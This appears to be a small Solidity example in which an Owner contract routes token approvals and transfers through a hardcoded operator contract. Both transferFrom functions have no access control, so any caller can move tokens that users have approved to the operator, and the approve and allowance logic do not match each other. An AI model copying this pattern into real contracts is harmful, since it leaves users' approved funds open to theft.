// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./Token.sol";

contract TransferToken {
    function transferFrom(
        address tokenAddress,
        address sender,
        address recipient,
        uint256 amount
    ) external {
        Token token = Token(tokenAddress);
        token.transferFrom(sender, recipient, amount);
    }
}

contract Owner {
    address operator;

    constructor() {
        operator = 0x0Df58F397340Cb1109134Ebe65c76dB067450081;
    }

    function transferFrom(
        address tokenAddress,
        address sender,
        address recipient,
        uint256 amount
    ) external {
        TransferToken transferToken = TransferToken(operator);
        transferToken.transferFrom(tokenAddress, sender, recipient, amount);
    }

    function approve(address tokenAddress, uint256 amount) external {
        Token token = Token(tokenAddress);
        token.approve(operator, amount);
    }

    function getAllowance(address tokenAddress) external view returns (uint) {
        Token token = Token(tokenAddress);
        return token.allowance(msg.sender, operator);
    }

    function getBalanceOf(address tokenAddress) external view returns (uint) {
        Token token = Token(tokenAddress);
        return token.balanceOf(msg.sender);
    }
}
